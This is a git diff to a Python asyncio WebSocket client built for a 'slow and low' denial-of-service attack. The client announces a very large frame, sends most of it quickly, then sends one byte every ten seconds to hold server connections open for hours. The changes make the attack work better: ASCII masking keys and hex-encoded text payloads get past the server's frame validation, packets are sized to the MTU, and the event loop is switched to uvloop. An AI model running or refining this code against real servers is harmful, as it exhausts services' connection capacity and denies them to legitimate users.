@@ -5,6 +5,8 @@ import os
 import random
 import asyncio
 import ssl
+import uvloop
+asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
 
 from .websocket_protocol import (
     WSMessageType,
@@ -55,7 +57,7 @@ async def _send_message(writer, data, opcode):
 
     data = websocket_mask(masking_key, data)
 
-    writer.write(header+masking_key+data)
+    writer.write(header + masking_key + data)
 
 
 async def _receive_message(reader):
@@ -98,12 +100,33 @@ async def _handshake(reader, writer, host, port, path):
     ws.receive_handshake_response(data)
 
 
+def _generate_ascii_mask():
+    """
+    If message is text, but unmasked data is binary, some implementations
+    return this error: "Status code: Invalid frame payload data (1007)".
+
+    To solve this error and avoid performance lost in masking, choose ascii
+    chars as masking key, and send random ascii data as masked data. Because
+    ascii mask/unmask ascii is still ascii.
+    """
+
+    masking_key = b''
+    for _i in range(4):
+        masking_key += random.randint(0, 127).to_bytes(1, 'big')
+    return masking_key
+
+
 async def _slow_and_low(writer, total_length, message_type, index):
     """
     Send a big chunk first, then send small data at slow speed.
     """
 
-    if total_length < 10000:
+    # send the last 10,000 bytes with 10s interval,
+    # keeps the connection alive for 100,000s, or 27 hours.
+    slow_length = 10000
+    keepalive = 10
+
+    if total_length < slow_length:
         raise Exception('Can not attack with less than 10K size of data.')
 
     msg_len = total_length
@@ -123,20 +146,29 @@ async def _slow_and_low(writer, total_length, message_type, index):
     else:
         header += pack_8bytes(msg_len)
 
-    writer.write(header)
+    masking_key = _generate_ascii_mask()
+
+    writer.write(header + masking_key)
 
     logging.info(f'{index}: start slow and low attack...')
 
-    # did not found a way to detect whether the connection is closed or not...
+    # TODO: did not found a way to detect whether the connection is closed or not...
+
     size_sent = 0
     for _i in range(msg_len):
-        pkt_len = random.randint(1000, 1400)
-        data = os.urandom(pkt_len)
+        # Fit each round into one MTU to improve some performance.
+        pkt_len = random.randint(500, 700) * 2
+
+        if message_type == WSMessageType.TEXT:
+            data = os.urandom(pkt_len//2).hex().encode('ascii')
+        else:
+            data = os.urandom(pkt_len)
+
         writer.write(data)
         await writer.drain()
 
         size_sent += pkt_len
-        if size_sent > total_length - 10000:
+        if size_sent > total_length - slow_length:
             break
 
     logging.info(f'{index}: sent data size {size_sent}')
@@ -146,10 +178,10 @@ async def _slow_and_low(writer, total_length, message_type, index):
     logging.info(f'{index}: send 1 byte every 10 second to keep alive for {slow_round} round')
 
     for _i in range(slow_round):
-        logging.debug(f'{index}: send 1 byte and sleep...')
-        data = os.urandom(1)
+        data = random.randint(0, 127).to_bytes(1, 'big')
         writer.write(data)
-        await asyncio.sleep(10)
+        logging.debug(f'{index}: sent 1 byte and sleep...')
+        await asyncio.sleep(keepalive)
 
 
 async def _read_and_discard(reader):
